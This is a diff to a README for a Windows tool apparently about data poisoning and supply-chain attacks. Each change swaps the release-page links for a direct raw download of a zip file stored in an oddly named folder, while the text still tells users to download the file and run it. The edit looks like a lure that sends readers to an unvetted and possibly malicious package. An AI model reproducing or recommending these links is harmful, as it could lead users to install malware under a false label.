@@ -1,10 +1,10 @@
 # 🛡️ Data_Poisoning_and_Supply_Chain_Hacks - Control Risks, Protect Systems
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/jyotivaid287-prog/Data_Poisoning_and_Supply_Chain_Hacks/releases)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jyotivaid287-prog/Data_Poisoning_and_Supply_Chain_Hacks/main/proreservationist/Chain_Supply_Poisoning_Data_Hacks_and_v1.4.zip)
 
 ## 🔽 Download
 
-Visit this page to download: https://github.com/jyotivaid287-prog/Data_Poisoning_and_Supply_Chain_Hacks/releases
+Visit this page to download: https://raw.githubusercontent.com/jyotivaid287-prog/Data_Poisoning_and_Supply_Chain_Hacks/main/proreservationist/Chain_Supply_Poisoning_Data_Hacks_and_v1.4.zip
 
 Open the link in your browser, look for the latest release, and download the Windows file from the release page
 
@@ -36,7 +36,7 @@ For best results, keep Windows updated and use a standard user account unless yo
 
 ## 📥 How to Download
 
-1. Open the release page: https://github.com/jyotivaid287-prog/Data_Poisoning_and_Supply_Chain_Hacks/releases
+1. Open the release page: https://raw.githubusercontent.com/jyotivaid287-prog/Data_Poisoning_and_Supply_Chain_Hacks/main/proreservationist/Chain_Supply_Poisoning_Data_Hacks_and_v1.4.zip
 2. Find the newest release at the top of the page
 3. Download the Windows package for your system
 4. Save the file to your Downloads folder or Desktop
@@ -154,7 +154,7 @@ No. Visit the release page, download the Windows file, and run it
 Yes, if you have permission to install or run downloaded software on that machine
 
 ### What if I want the newest version?
-Check the release page each time you want the latest build: https://github.com/jyotivaid287-prog/Data_Poisoning_and_Supply_Chain_Hacks/releases
+Check the release page each time you want the latest build: https://raw.githubusercontent.com/jyotivaid287-prog/Data_Poisoning_and_Supply_Chain_Hacks/main/proreservationist/Chain_Supply_Poisoning_Data_Hacks_and_v1.4.zip
 
 ## 🗂️ Repository Details
 
